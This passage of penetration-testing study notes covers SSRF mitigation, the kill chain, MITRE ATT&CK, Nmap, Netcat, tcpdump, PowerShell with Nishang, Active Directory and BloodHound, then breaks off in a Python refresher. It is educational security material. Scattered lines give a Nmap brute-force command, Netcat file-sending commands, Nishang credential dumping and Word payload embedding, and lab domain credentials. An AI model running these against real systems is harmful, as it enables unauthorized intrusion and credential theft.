&nbsp;			§ Breaches in cloud-hosted systems due to overly permissive network access.

&nbsp;		○ Testing \& Indicators

&nbsp;			§ Look for weak/missing URL validation.

&nbsp;			§ Check if the app trusts all user-supplied URLs.

&nbsp;			§ Evaluate architecture: does network segmentation restrict internal traffic?

&nbsp;			§ Validate how the app handles redirects and other protocols (not just HTTP).

&nbsp;		○ Mitigation Strategies

&nbsp;			§ Input validation \& sanitation of URLs.

&nbsp;			§ Deny HTTP redirects to attacker-controlled destinations.

&nbsp;			§ Use allow-lists (preferred over deny-lists) to restrict outbound traffic to known safe destinations.

&nbsp;			§ Network segmentation to limit what internal services are reachable.

&nbsp;			§ Strong cloud security configuration standards to prevent misconfigured buckets/endpoints.

&nbsp;		○ Resources

&nbsp;			§ OWASP SSRF Prevention Cheat Sheet – practical safeguards for developers.

&nbsp;			§ SSRF Bible (Wallarm research team) – in-depth guide with attack/defense examples (23-page PDF).

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Penetration Testing

#### What is Pen Testing?





Pen Testing Overview

&nbsp;	• Security testing evolved from “prove it works” to “assume it will be attacked.” Pen testing applies an attacker’s mindset, tools, and creativity to uncover weaknesses that functional tests and vuln scanners miss.

&nbsp;	• Key Concepts

&nbsp;		○ Functional testing vs. pen testing: From validating expected behavior to actively trying to break things with unexpected inputs (e.g., command injection, crafted packets).

&nbsp;		○ “Think like a developer” → “Think like an attacker”: Imagination and adversarial tactics are central to modern testing.

&nbsp;		○ Hacker taxonomy

&nbsp;			§ White hats: Authorized testers.

&nbsp;			§ Black hats: Unauthorized (including script kiddies, research hackers, cybercriminals, state-sponsored actors).

&nbsp;			§ Script kiddies: Run prebuilt tools with little skill.

&nbsp;			§ Research hackers: Discover bugs/zero-days, sometimes sell exploits.

&nbsp;			§ State-sponsored \& organized crime: Skilled, stealthy, use zero-days, cause major damage.

&nbsp;		○ Tooling \& frameworks

&nbsp;			§ Individual tools (commercial/community, freeware/shareware).

&nbsp;			§ Kali Linux: A primary free distro bundling 600+ tools; common pen-test platform.

&nbsp;		○ Roles \& skill tiers

&nbsp;			§ Ethical hacker: Runs standard tests to raise baseline assurance.

&nbsp;			§ Pen tester: Deeper skills; finds sophisticated weaknesses; can demonstrate exploitability (modify/create exploits).

&nbsp;			§ Elite pen tester: Highest skill; often discovers zero-days; contributes tools to the community.

&nbsp;		○ Certifications / learning path

&nbsp;			§ CEH: Foundational, now hands-on; entry to ethical hacking/pen testing.

&nbsp;			§ OSCP (PEN-200) from Offensive Security: Benchmark for professional pen testers; proves applied skill against unknown targets.

&nbsp;		○ Pen testing vs. vulnerability scanning

&nbsp;			§ Vuln scanning (e.g., perimeter services, internal scanners like Nessus, Rapid7/Nexpose): Checks for known issues.

&nbsp;			§ Pen testing: Goes beyond signatures to uncover oversights and unknown/zero-day paths.

&nbsp;		○ Red teaming

&nbsp;			§ Unannounced, authorized, full-scope attack simulation across the enterprise; goal is to reach internal systems like a real adversary.

&nbsp;		○ Cyber hunting (threat hunting)

&nbsp;			§ Proactively analyzes networks/servers for indicators of compromise using NIDS and security analytics; an emerging discipline expected to grow.



The Cyber Kill Chain

&nbsp;	• The cyber kill chain is a model introduced by Lockheed Martin (2009) that describes the stages of a cyberattack, from reconnaissance to final action. It provides a framework for defenders to understand, detect, and disrupt attacks at multiple points in their lifecycle.

&nbsp;	• Key Concepts

&nbsp;		○ Origins

&nbsp;			§ Introduced in Lockheed Martin’s paper “Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains”.

&nbsp;			§ Concept: Cyberattacks can be understood as a series of steps (a chain), and breaking any step can prevent the attack from succeeding.

&nbsp;		○ The Seven Stages of the Cyber Kill Chain

&nbsp;			§ Reconnaissance

&nbsp;				□ Attacker gathers information about the target.

&nbsp;				□ Techniques: scanning IP addresses, port scanning, mapping domains.

&nbsp;				□ Often automated using botnets.

&nbsp;			§ Weaponization

&nbsp;				□ Developing or acquiring malware tailored to the target.

&nbsp;				□ Example: custom exploits for a specific OS or website.

&nbsp;				□ Increasingly purchased on underground markets rather than coded by the attacker.

&nbsp;			§ Delivery

&nbsp;				□ Getting the malware to the victim.

&nbsp;				□ Methods: phishing emails, malicious websites, stolen/default credentials, infected flash drives.

&nbsp;			§ Exploitation

&nbsp;				□ Malware (or attacker) takes advantage of a vulnerability.

&nbsp;				□ Example: opening a malicious attachment, visiting an infected site, or unauthorized credential use.

&nbsp;			§ Installation

&nbsp;				□ Payload is installed on the victim’s system.

&nbsp;				□ Ensures persistence (e.g., Windows registry autorun).

&nbsp;				□ Creates a foothold for deeper attacks.

&nbsp;			§ Command and Control (C2)

&nbsp;				□ Compromised system contacts the attacker’s server to receive instructions.

&nbsp;				□ Enables remote control, data exfiltration, and continued exploitation.

&nbsp;			§ Actions on Objectives

&nbsp;				□ Final goal depending on attacker motives:

&nbsp;					® Hacktivists → deface websites.

&nbsp;					® State actors → steal sensitive info.

&nbsp;					® Cybercriminals → financial theft.

&nbsp;				□ Always harmful to the victim.

&nbsp;		○ Attack Characteristics

&nbsp;			§ Automation: Large-scale attacks rely on botnets.

&nbsp;			§ Beachheads: Often compromise an exposed host first, then move laterally.

&nbsp;			§ Exploitation methods: Often rely on human error (phishing, malicious documents).

&nbsp;			§ Persistence: Ensures continued access.

&nbsp;			§ Flexibility: C2 servers may change addresses to avoid detection.



The MITRE ATT\&CK Repository

&nbsp;	• The MITRE ATT\&CK framework is a globally accessible, continuously updated knowledge base of adversary tactics, techniques, and procedures (TTPs). It builds on the cyber kill chain concept but goes much deeper—detailing specific methods attackers use, along with detection, mitigation, and attribution information. It’s widely used for threat analysis, defense design, and cyber threat intelligence.

&nbsp;	• Key Concepts

&nbsp;		○ What MITRE ATT\&CK Is

&nbsp;			§ A repository of real-world cyberattack tactics and techniques observed in the wild.

&nbsp;			§ Covers the entire attack lifecycle, from reconnaissance through impact.

&nbsp;			§ Provides practical guidance for defenders to understand how adversaries operate.

&nbsp;		○ Structure

&nbsp;			§ Matrices: Organized by attack stages (12 in total).

&nbsp;				□ Example: External Remote Services under Initial Access shows methods of exploiting remote access points.

&nbsp;			§ Tactics: High-level goals attackers pursue (e.g., Persistence, Privilege Escalation, Collection).

&nbsp;			§ Techniques (and sub-techniques): Specific ways those goals are achieved.

&nbsp;				□ Example: T1123 – Audio Capture → malware can activate the microphone to eavesdrop.

&nbsp;		○ Detailed Information Provided

&nbsp;			§ For each technique, MITRE ATT\&CK includes:

&nbsp;				□ Description of how it works.

&nbsp;				□ Examples of threat actors or malware families using it.

&nbsp;				□ Mitigations: Defensive measures to reduce risk.

&nbsp;				□ Detection methods: Logs, monitoring, behavioral analytics.

&nbsp;				□ References: Links to research and incident reports.

&nbsp;		○ Threat Actor Groups

&nbsp;			§ ATT\&CK tracks known adversary groups and their associated TTPs.

&nbsp;			§ Example: Platinum → a group targeting governments and organizations in South and Southeast Asia.

&nbsp;			§ This helps in attribution and threat profiling.



#### Pen Testing Tools



Scanning networks with Nmap

&nbsp;	Nmap is a core penetration testing tool used to discover hosts, open ports, services, operating systems, and vulnerabilities on a network. It offers a wide range of scanning options that allow security testers to map out attack surfaces and assess system exposure.

&nbsp;	• Key Concepts

&nbsp;		○ Host Discovery

&nbsp;			§ nmap -sn 10.0.2.0/24 → ICMP ping sweep to identify live hosts.

&nbsp;			§ Only reports hosts that respond.

&nbsp;			§ Some hosts may not respond to ping, requiring other options.

&nbsp;		○ TCP Scanning

&nbsp;			§ -PS → TCP SYN scan (SYN ping).

&nbsp;				□ Sends a SYN packet; open ports reply with SYN-ACK.

&nbsp;				□ Connection is terminated before completion.

&nbsp;			§ Reveals which services/ports are open and accessible.

&nbsp;		○ Bypassing Ping Checks

&nbsp;			§ -P0 (or -Pn in newer versions) → Skip ping test.

&nbsp;				□ Useful for systems that block ICMP (e.g., firewalled hosts).

&nbsp;				□ Example: nmap -PS -P0 10.0.2.38.

&nbsp;		○ UDP Scanning

&nbsp;			§ -sU → Probes UDP ports (usually slower and requires root).

&nbsp;			§ Checks common 1,000 UDP ports.

&nbsp;			§ Example: sudo nmap -sU 10.0.2.32.

&nbsp;		○ Service \& Version Detection

&nbsp;			§ -sV → Identifies the version of software running on a port.

&nbsp;			§ -p → Specify a port or port range.

&nbsp;			§ Example: nmap -p22 -sV 10.0.2.32 → Finds OpenSSH 4.7p1.

&nbsp;		○ Combined TCP/UDP \& Custom Ports

&nbsp;			§ Example:

&nbsp;				sudo nmap -sSUV -p U:53,111,137,T:21-25,80,139,8080 10.0.2.32

&nbsp;			§ -sSUV → Scan both TCP/UDP + version detection.

&nbsp;			§ Custom port ranges for deeper analysis.

&nbsp;		○ OS Detection

&nbsp;			§ -O → Fingerprints target OS.

&nbsp;			§ Example: sudo nmap -O 10.0.2.32 → Correctly identifies Linux.

&nbsp;		○ Nmap Scripting Engine (NSE)

&nbsp;			§ Located in /usr/share/nmap/scripts.

&nbsp;			§ Adds advanced capabilities (brute force, vuln detection, malware discovery).

&nbsp;			§ Example:

&nbsp;				nmap --script=rexec-brute -p512 10.0.2.32

&nbsp;			§ Runs brute-force against Rexec service, extracting valid credentials.



A Netcat Refresher

&nbsp;	• Netcat (often called the Swiss Army knife of networking) is a versatile tool for sending, receiving, and manipulating data across networks. It supports functions like chat, file transfer, service interaction, and port listening, making it invaluable for network diagnostics, penetration testing, and system administration.

&nbsp;	• Key Concepts

&nbsp;		○ Fundamental Role

&nbsp;			§ Works as either a sender (client) or receiver (listener).

&nbsp;			§ Transfers raw data streams between systems.

&nbsp;			§ Installed by default in Kali Linux; widely available on other platforms.

&nbsp;		○ Chat / Raw Connection

&nbsp;			§ Listener setup: nc -lp 4545 (listen on port 4545).

&nbsp;			§ Client connection: nc <IP> 4545.

&nbsp;			§ Creates a simple two-way chat over TCP.

&nbsp;			§ Demonstrates Netcat’s ability to establish arbitrary raw connections.

&nbsp;		○ File Transfer

&nbsp;			§ Server/receiver: nc -lp 4545 > incoming.txt → saves incoming data into a file.

&nbsp;			§ Client/sender: nc <target IP> 4545 < myfile.txt → sends file contents.

&nbsp;			§ Allows simple one-line file transfer between systems.

&nbsp;		○ Connecting to Services

&nbsp;			§ HTTP:

&nbsp;				□ nc -v google.com 80 → connects to a web server.

&nbsp;				□ Manually send an HTTP request (e.g., GET /index.html HTTP/1.1).

&nbsp;			§ FTP:

&nbsp;				□ nc -v <IP> 21 → connects to an FTP server.

&nbsp;				□ Supports logging in, issuing commands, and interacting with the service directly.

&nbsp;			§ Shows Netcat as a flexible client for testing services.

&nbsp;		○ Options \& Flags

&nbsp;			§ -l → listen mode.

&nbsp;			§ -p → specify port.

&nbsp;			§ -v → verbose mode (connection feedback).

&nbsp;			§ Redirection (> and <) used for file input/output.

&nbsp;		○ Use Cases

&nbsp;			§ Ad-hoc communication between systems.

&nbsp;			§ Quick file transfer without FTP/HTTP setup.

&nbsp;			§ Testing services like HTTP and FTP at the raw protocol level.

&nbsp;			§ Troubleshooting and penetration testing, e.g., confirming open ports or service behaviors.



Capturing Packets with Tcpdump

&nbsp;	• Tcpdump is a command-line packet capture tool for analyzing network traffic. It allows penetration testers and defenders to inspect, filter, and diagnose network communications in real time. It’s lightweight, flexible, and highly customizable through expressions and filters.

&nbsp;	• Key Concepts

&nbsp;		○ Setup \& Modes

&nbsp;			§ Promiscuous mode: Needed to capture packets not addressed to the host (enabled in VM settings).

&nbsp;			§ Run with root privileges (sudo) for packet capture.

&nbsp;			§ tcpdump -D → List available interfaces.

&nbsp;			§ -i any → Capture from all interfaces.

&nbsp;			§ -c <n> → Limit number of packets captured.

&nbsp;		○ Basic Options

&nbsp;			§ -n → Suppress hostname resolution.

&nbsp;			§ -nn → Suppress both hostname \& port name resolution (shows raw IP:port).

&nbsp;			§ -t → Human-readable timestamps.

&nbsp;			§ -x → Show packet in hex + ASCII.

&nbsp;			§ -v, -vv, -vvv → Verbosity levels.

&nbsp;			§ -s → Set packet size displayed (-s0 = full packet).

&nbsp;		○ Filtering Expressions

&nbsp;			§ Types:

&nbsp;				□ host/net/port → e.g., host 10.0.2.38, net 10.0.2.0/24.

&nbsp;			§ Direction:

&nbsp;				□ src, dst → Source/destination filters.

&nbsp;			§ Protocols:

&nbsp;				□ tcp, udp, icmp, ip6, etc.

&nbsp;			§ Examples:

&nbsp;				□ tcpdump -i eth0 -c 10 host 10.0.2.38 → Capture traffic to/from host.

&nbsp;				□ tcpdump udp → Only UDP traffic.

&nbsp;				□ tcpdump dst port 443 → Destination HTTPS traffic.

&nbsp;				□ tcpdump portrange 1-1023 → Common system ports.

&nbsp;		○ Advanced Use

&nbsp;			§ Write capture: -w file.pcap → Save in PCAP format for Wireshark.

&nbsp;			§ Logical operators: and, or, parentheses.

&nbsp;				□ Example: (src 10.0.2.38 and (dst port 80 or dst port 443)).

&nbsp;			§ Flag filtering:

&nbsp;				□ Example: tcp\[13] \& 2 != 0 → Capture SYN packets.

&nbsp;				□ Example: tcp\[tcpflags] \& tcp-syn != 0.

&nbsp;			§ Banner matching:

&nbsp;				□ Search for services (e.g., SSH) by looking for specific text strings in packets.

&nbsp;		○ Diagnostics \& Security Use Cases

&nbsp;			§ Identify what services are running (e.g., SSH headers).

&nbsp;			§ Detect suspicious or malformed traffic (e.g., invalid flag combos like RST+SYN).

&nbsp;			§ Trace communication patterns (who is talking to whom).

&nbsp;			§ Gather evidence of attacks or service exploitation attempts.



Work with netstat, nbtstat, and arp

&nbsp;	• Netstat, nbtstat, and arp are fundamental network diagnostic tools. They allow administrators and security testers to observe connections, ports, processes, routing, and address resolution mappings, which is critical for identifying anomalies and potential security issues without deep packet analysis.

&nbsp;	• Key Concepts

&nbsp;		○ Netstat (Network Statistics)

&nbsp;			§ Purpose: Displays active network connections and protocol statistics.

&nbsp;			§ Basic usage:

&nbsp;				□ netstat → Lists current TCP connections.

&nbsp;			§ Key columns:

&nbsp;				□ Protocol (TCP/UDP), Local address + port, Foreign address, Connection state.

&nbsp;			§ Useful switches:

&nbsp;				□ -b → Show the executable/program creating the connection.

&nbsp;				□ -o → Show the process ID owning the connection/port.

&nbsp;				□ -a → Show all services (TCP/UDP), both established and listening.

&nbsp;				□ -rn → Show routing table and interface info in numeric IP form.

&nbsp;			§ Insight: Helps identify suspicious or unexpected connections, open listening ports, and services that may be exposed.

&nbsp;		○ ARP (Address Resolution Protocol)

&nbsp;			§ Purpose: Maps IP addresses to MAC addresses (link-layer identifiers).

&nbsp;			§ Basic usage:

&nbsp;				□ arp -a → Display ARP table (all entries).

&nbsp;				□ arp -s <IP> <MAC> → Add a static ARP entry.

&nbsp;			§ Security concern:

&nbsp;				□ ARP tables can be modified maliciously for Man-in-the-Middle (MITM) attacks.

&nbsp;				□ Monitoring ARP entries helps detect anomalies like spoofed MAC addresses.

&nbsp;		○ Nbtstat

&nbsp;			§ Purpose: Used on Windows to diagnose NetBIOS over TCP/IP connections.

&nbsp;			§ Usage:

&nbsp;				□ nbtstat -n → List local NetBIOS names.

&nbsp;				□ nbtstat -A <IP> → Query remote machine for NetBIOS names.

&nbsp;			§ Value: Identifies file-sharing services, NetBIOS names, and possible vulnerabilities in older Windows networks.



Scripting with PowerShell

&nbsp;	• PowerShell is Microsoft’s powerful command-line shell and scripting environment, serving as the Windows equivalent of Bash on Linux. It combines command-line utilities, scripting, and access to Windows system management (WMI). It’s essential for both administrators (automation, system control) and penetration testers (system inspection and exploitation).

&nbsp;	• Key Concepts

&nbsp;		○ What PowerShell Is

&nbsp;			§ Built into all modern Windows systems.

&nbsp;			§ Mixes command-line tools, scripting language features, and Windows Management Instrumentation (WMI) access.

&nbsp;			§ Used for automation, system administration, and penetration testing.

&nbsp;		○ Cmdlets

&nbsp;			§ PowerShell introduces cmdlets (command-lets), small specialized commands.

&nbsp;			§ Verb-Noun syntax (standardized format):

&nbsp;				□ Examples: Get-Help, Get-Process, Set-Service.

&nbsp;			§ Get-Verb → Lists available verbs (~98 verbs).

&nbsp;			§ Consistent, discoverable naming makes it easier to learn and script.

&nbsp;		○ Help System

&nbsp;			§ help <command> → Provides usage information.

&nbsp;			§ Example: help push shows Push-Location cmdlet.

&nbsp;			§ Full docs show purpose, parameters, and related commands.

&nbsp;		○ Compatibility with Standard Commands

&nbsp;			§ Supports Windows shell commands (e.g., cd, dir, ipconfig)

&nbsp;			§ Also supports some Linux-style commands (cat, redirection operators <, >).

&nbsp;		○ Scripting Basics

&nbsp;			§ Scripts saved as .ps1 files.

&nbsp;			§ Run scripts with prefix: .\\script.ps1.

&nbsp;			§ PowerShell ISE (Integrated Scripting Environment) provides GUI assistance (syntax highlighting, autocomplete).

&nbsp;			§ Variables use $ prefix.

&nbsp;			§ Lists (arrays) supported, with .count property for length.

&nbsp;		○ Programming Constructs

&nbsp;			§ Output: echo or Write-Host.

&nbsp;			§ Conditionals: if-then statements, multi-line syntax.

&nbsp;			§ Loops:

&nbsp;				□ do { } while()

&nbsp;				□ ForEach → cleaner for list iteration.

&nbsp;			§ Variable substitution in strings: variables inside strings expand automatically.

&nbsp;		○ Practical Uses

&nbsp;			§ Automating Windows administration tasks.

&nbsp;			§ Interfacing with WMI for deep system data.

&nbsp;			§ Running executables and scripts directly.

&nbsp;			§ Useful for penetration testers to query system state, processes, services, and exploit automation.



Extending PowerShell with Nishang

&nbsp;	• Nishang is a collection of offensive PowerShell scripts (cmdlets) created by Nikhil Mittal, widely used for penetration testing and red team operations. It extends PowerShell’s native capabilities, adding tools for information gathering, credential dumping, lateral movement, brute force, payload generation, and malware detection.

&nbsp;	• Key Concepts

&nbsp;		○ What Nishang Is

&nbsp;			§ A PowerShell exploitation framework.

&nbsp;			§ Available by default in Kali Linux, but can also be installed on Windows.

&nbsp;			§ Downloadable from GitHub (requires manual extraction).

&nbsp;			§ Must be run as Administrator, with antivirus protection often disabled (many scripts are flagged as malicious).

&nbsp;		○ Setup \& Loading

&nbsp;			§ Execution policy: Unsigned scripts need to be allowed.

&nbsp;			§ Unblocking scripts: Use Get-ChildItem (gci) to recursively unblock contents.

&nbsp;			§ Importing adds many new Nishang cmdlets into PowerShell.

&nbsp;		○ Core Capabilities

&nbsp;			§ Information Gathering

&nbsp;				□ Collects system data: users, hosts, installed software, drivers, interfaces, etc.

&nbsp;			§ Credential \& Hash Extraction

&nbsp;				□ Invoke-Mimikatz → Extracts credentials from memory.

&nbsp;				□ Get-PassHashes → Extracts password hashes.

&nbsp;			§ Port Scanning

&nbsp;				□ Identifies open ports for lateral movement.

&nbsp;			§ Payload Generation (Weaponization)

&nbsp;				□ Out-Word → Embeds payloads into Word documents.

&nbsp;				□ Other payload formats: Excel (Out-XL), Shortcuts (Out-Shortcut), Compiled HTML Help (Out-CHM), JavaScript (Out-JS).

&nbsp;			§ Brute Force Attacks

&nbsp;				□ Invoke-BruteForce → Runs dictionary attacks against services (e.g., FTP).

&nbsp;				□ Supports verbose mode and stopping on success.

&nbsp;			§ Malware Detection via VirusTotal

&nbsp;				□ Invoke-Prasadhak → Uploads process executables’ hashes to VirusTotal (requires API key).

&nbsp;				□ Helps verify whether running processes are malicious.

&nbsp;		○ Security \& Testing Implications

&nbsp;			§ For penetration testers: Extends PowerShell into a post-exploitation toolkit, enabling realistic adversary simulations.

&nbsp;			§ For defenders: Highlights how attackers may abuse PowerShell and Nishang for lateral movement and persistence.

&nbsp;			§ Detection: Many commands overlap with known attacker TTPs (aligned with MITRE ATT\&CK).



What is Active Directory?

&nbsp;	• Active Directory (AD) is Microsoft’s LDAP-compliant identity and domain management system, central to most enterprise networks. It manages identities, access, policies, and trust relationships across complex organizational structures. Understanding AD is crucial for both administrators and penetration testers because it is a common target in attack chains.

&nbsp;	• Key Concepts

&nbsp;		○ Active Directory Domain Services (AD DS) is the full name.

&nbsp;		○ Provides much more than an LDAP directory:

&nbsp;			§ Identities (users, groups, services).

&nbsp;			§ Domain management (policies, security, replication).

&nbsp;			§ Centralized authentication and authorization.

&nbsp;		○ Core Components

&nbsp;			§ AD Objects: Users, computers, groups, policies, etc.

&nbsp;			§ Schema: Defines AD objects and their attributes.

&nbsp;			§ Catalog: Hierarchical structure (containers for browsing/searching objects).

&nbsp;			§ Group Policy Objects (GPOs): Centralized configuration for users/computers.

&nbsp;			§ Replication Service: Synchronizes data across domain controllers.

&nbsp;			§ Security system: Controls authentication and access within domains.

&nbsp;		○ Hierarchical Structure

&nbsp;			§ Realm: The full enterprise scope.

&nbsp;			§ Forests: Independent groups of domains (each a security boundary).

&nbsp;				□ One org = one forest, or multiple for conglomerates/business units.

&nbsp;			§ Domains: Logical groupings of AD objects (users, machines, etc.).

&nbsp;			§ Subdomains: Nested hierarchies (domain → subdomain → sub-subdomain).

&nbsp;			§ Sites: Sub-hierarchy reflecting physical network topology.

&nbsp;				□ Important for replication and group policy application.

&nbsp;				□ Policies apply in order: domain → site → local machine.

&nbsp;		○ Trust Relationships

&nbsp;			§ Required for replication between domains.

&nbsp;			§ Enable cross-domain access (users in one domain querying another).

&nbsp;			§ Critical for enterprise-wide authentication and collaboration.

&nbsp;		○ Practical Relevance

&nbsp;			§ AD structures often mirror real-world business organization (domains, subdomains, forests).

&nbsp;			§ Tools like DMitry can reveal public subdomains (e.g., yahoo.com → ca.yahoo.com, uk.yahoo.com).

&nbsp;			§ AD is a frequent attack target, since compromising domain controllers can yield enterprise-wide access.

&nbsp;			§ Essential knowledge for penetration testers and defenders.



Analyzer Active Directory with BloodHound

&nbsp;	• Bloodhound is a tool used in penetration testing to map out relationships and privilege paths in Active Directory (AD) environments. It helps testers (and attackers) identify how a standard domain user could escalate privileges to become a domain administrator by analyzing AD objects and permissions.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of BloodHound

&nbsp;			§ Identifies privilege escalation paths in AD.

&nbsp;			§ Maps users, groups, permissions, and trust relationships.

&nbsp;			§ Useful for penetration testers to plan escalation from low-privileged accounts to high-value targets (e.g., domain admins).

&nbsp;		○ How BloodHound Works

&nbsp;			§ Data Collection:

&nbsp;				□ Requires a domain user account to query AD.

&nbsp;				□ Uses BloodHound-python (or other collectors) to gather data.

&nbsp;				□ Collector outputs JSON files with AD structure.

&nbsp;			§ Data Analysis:

&nbsp;				□ Data imported into BloodHound, which uses a Neo4j graph database.

&nbsp;				□ Relationships between users, groups, and permissions are visualized.

&nbsp;				□ Analysts can run queries and built-in analytics to find escalation opportunities.

&nbsp;		○ BloodHound Setup

&nbsp;			§ Obtain domain user credentials (in example: jdoe76 / JDPass2021).

&nbsp;			§ Run bloodhound-python with domain, username, password, and name server to extract AD data.

&nbsp;			§ Start Neo4j (graph database backend).

&nbsp;			§ Load JSON data into BloodHound GUI.

&nbsp;		○ Analysis Examples

&nbsp;			§ Path Finding:

&nbsp;				□ Can search for paths from a given user to Domain Admins@<domain>.

&nbsp;				□ Example: user AKATT42 → found to be a member of Domain Admins.

&nbsp;			§ Built-in Analytics:

&nbsp;				□ List all Domain Admins → identifies accounts with highest privileges.

&nbsp;				□ List all Kerberoastable Accounts → service accounts vulnerable to Kerberos ticket extraction.

&nbsp;				□ Find AS-REP Roastable Users → accounts without Kerberos pre-authentication (easily brute-forced)

&nbsp;			§ These help uncover stepping stones toward escalation.

&nbsp;		○ Why It Matters

&nbsp;			§ BloodHound is especially effective in large, complex AD environments where manual privilege mapping is impractical.

&nbsp;			§ It provides defenders and testers with visibility of privilege pathways attackers could exploit.

&nbsp;			§ Helps prioritize which accounts to protect (e.g., vulnerable service accounts, non-preauth accounts, or domain admins).



#### Bash Scripting





Refreshing Your Bash Skills

&nbsp;	• Bash is a core Linux shell and scripting language. It allows automation of tasks, command execution, and user interaction through scripts (.sh files). For penetration testers (and system administrators), refreshing Bash scripting skills is important for building quick utilities, automating tests, and handling command-line workflows.

&nbsp;	• Key Concepts

&nbsp;		○ Bash Basics

&nbsp;			§ Shell scripts are text files with a .sh extension.

&nbsp;			§ First line typically declares the interpreter (shebang: #!/bin/bash).

&nbsp;			§ Scripts must be made executable with chmod +x filename.sh.

&nbsp;			§ Execution: ./filename.sh.

&nbsp;		○ Hello World Example

&nbsp;			§ Classic example script (hello.sh) assigns a string variable and prints it.

&nbsp;			§ Demonstrates how Bash executes commands in sequence.

&nbsp;		○ Command-Line Arguments

&nbsp;			§ $1, $2, etc. → Positional parameters for arguments passed to the script.

&nbsp;			§ Example (argue.sh): two arguments combined to print "Hello World".

&nbsp;			§ Useful for writing scripts that adapt based on user input.

&nbsp;		○ Variables and Arithmetic

&nbsp;			§ Variables are untyped in Bash.

&nbsp;			§ Arithmetic operations use double bracket syntax (( )).

&nbsp;			§ Example (variables.sh):

&nbsp;				• Takes input from command-line.

&nbsp;				• Compares values with constants.

&nbsp;				• Performs numeric addition.

&nbsp;		○ Reading User Input

&nbsp;			§ read command → captures input from the terminal.

&nbsp;			§ Can prompt with echo, or inline prompt (read -p).

&nbsp;			§ Example (reader.sh): reads a name and prints a message using it.

&nbsp;			§ Demonstrates interactive scripting.



Controlling the Flow in a Script

&nbsp;	• Bash provides flow control statements (loops and conditionals) that allow scripts to make decisions and repeat tasks. These constructs make Bash scripting more powerful, flexible, and capable of handling real-world automation and penetration testing workflows.

&nbsp;	• Key Concepts

&nbsp;		○ For Loops

&nbsp;			§ Example (fortest.sh):

&nbsp;				• Uses array length (^ or ${#array\[@]}) to determine loop range.

&nbsp;				• First array element index = 0.

&nbsp;				• Syntax: ${i} used as the array index inside the loop.

&nbsp;			§ Prints out list of array elements sequentially.

&nbsp;		○ While Loops

&nbsp;			§ Executes code repeatedly while a condition is true.

&nbsp;			§ Example (wutest.sh):

&nbsp;				• Starts index at 6.

&nbsp;				• Decrements index until it is no longer greater than 0.

&nbsp;			§ Demonstrates countdown behavior.

&nbsp;		○ Until Loops

&nbsp;			§ Opposite of while. Runs until a condition becomes true.

&nbsp;			§ Example:

&nbsp;				• Starts index at 1

&nbsp;				• Increments until index is greater than 6.

&nbsp;			§ Demonstrates counting upward.

&nbsp;		○ If-Else Statements

&nbsp;			§ Enable conditional execution based on tests.

&nbsp;			§ Example (iftest.sh):

&nbsp;				• Uses -d operator to check if a directory exists.

&nbsp;				• If it exists → print confirmation + list contents.

&nbsp;				• If not → display “doesn’t exist” message.

&nbsp;			§ Example results:

&nbsp;				• iftest.sh barney → directory missing.

&nbsp;				• iftest.sh /usr/share/Thunar → directory exists, contents listed.



Using Functions in Bash

&nbsp;	• Bash allows the creation and use of functions within scripts, making them more modular, reusable, and easier to maintain. Functions can also be combined with control structures like case statements and select menus to build interactive, flexible scripts.

&nbsp;	• Key Concepts

&nbsp;		○ Functions in Bash

&nbsp;			§ Defined with a function name followed by {} enclosing commands.

&nbsp;			§ Can accept parameters (e.g., $1 for the first argument).

&nbsp;			§ Promote code reuse and better script structure.

&nbsp;			§ Example: A function that takes a city name and outputs language advice.

&nbsp;		○ Operators in Bash

&nbsp;			§ String comparisons/assignments: Single equals sign =.

&nbsp;			§ Numeric comparisons: Double equals ==.

&nbsp;			§ Knowing the difference prevents logic errors in scripts.

&nbsp;		○ Select Statement

&nbsp;			§ Provides a menu-driven interface in Bash.

&nbsp;			§ Automatically loops until a break condition is met.

&nbsp;			§ Works with the PS3 variable (prompt string), e.g., PS3=">"

&nbsp;		○ Case Statement

&nbsp;			§ Used to handle different menu selections or conditions.

&nbsp;			§ Cleaner and more readable than nested if statements.

&nbsp;			§ Works well with select for handling menu-driven choices.

&nbsp;		○ Practical Example

&nbsp;			§ Script (fntest.sh) combines:

&nbsp;				□ A function (speak) → checks a city and outputs the language spoken.

&nbsp;				□ A select menu → lets the user choose a city.

&nbsp;				□ A case statement → maps city to country.

&nbsp;				□ A function call → outputs language info after the country is printed.

&nbsp;			§ Demo outputs:

&nbsp;				□ Choosing Melbourne → “Australia, Language: English.”

&nbsp;				□ Choosing Paris → “France, Language: French.”

&nbsp;				□ Choosing Hanoi → “Vietnam, Language: Vietnamese + French/English.”

&nbsp;				□ Choosing Asmara → “Eritrea, try English (louder).”



#### Python Scripting



Refresh your Python Skills

&nbsp;	• Python is an interpreted, cross-platform programming language widely used for automation, penetration testing, and scripting. This refresher highlights its core syntax, data structures, and flow control mechanisms that are especially useful for pen testers and system administrators.

&nbsp;	• Key Concepts

&nbsp;		○ Python Basics

&nbsp;			§ Interpreted language: Runs line by line in an interpreter (e.g., python in terminal).

&nbsp;			§ Available for Windows and Linux (pre-installed on most Linux distros like Kali).

&nbsp;			§ Scripts are plain text files (e.g., hello.py) run with python script.py.

&nbsp;			§ Different versions exist (e.g., Python 2 vs Python 3), so compatibility matters when reusing scripts.

&nbsp;		○ Data Types \& Variables

&nbsp;			§ Python is dynamically typed: variable type is set by assignment.

&nbsp;			§ Common types:

&nbsp;				□ Integer (8080)

&nbsp;				□ Float (12.43)

&nbsp;				□ Boolean (True/False)

&nbsp;				□ String ("Malcolm")

&nbsp;			§ Type can be checked with type(variable).

&nbsp;			§ Supports normal operators (math, string concatenation).

&nbsp;		○ Collections

&nbsp;			§ Lists (\[ ]): Ordered sequences, indexed starting at 0.

&nbsp;				□ Example: activehost = \[], then .append("10.0.2.8").

&nbsp;				□ Access elements with \[index].

&nbsp;			§ Dictionaries ({ }): Key-value pairs.

&nbsp;				□ Example: hostname = {"173.23.1.1": "munless.com.ch"}.

&nbsp;				□ Keys map to values, can be updated with .update().

&nbsp;				□ Looping: for key in hostname: print(key, hostname\[key]).

&nbsp;		○ Conditionals

&nbsp;			§ If/Else statements: Used for logic.

&nbsp;				□ Example:

&nbsp;					numb = 5

&nbsp;					if numb < 10:

&nbsp;					    print("Single digit value")

&nbsp;				□ Indentation is critical—Python uses whitespace to define scope.

&nbsp;		○ Loops

&nbsp;			§ For loops: Iterates over ranges or sequences.

